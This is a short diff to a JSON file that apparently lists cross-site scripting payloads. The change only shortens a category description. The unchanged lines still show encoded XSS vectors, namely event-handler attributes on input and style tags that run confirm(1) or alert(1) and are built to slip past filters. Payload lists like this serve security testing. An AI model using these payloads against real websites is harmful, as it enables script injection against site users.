@@ -1,6 +1,6 @@
 {
   "normal": {
-    "description": "Standard XSS payloads that use various encoding techniques, event handlers, and DOM manipulation to execute JavaScript in a browser. These payloads demonstrate common XSS vectors that might bypass basic filtering.",
+    "description": "Normal XSS payloads",
     "payloads": [
       "%3Cinput%2Fonmouseover=%22javaSCRIPT&colon;confirm&lpar;1&rpar;%22%3E",
       "&lt;style&#x2F;onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;&gt;",
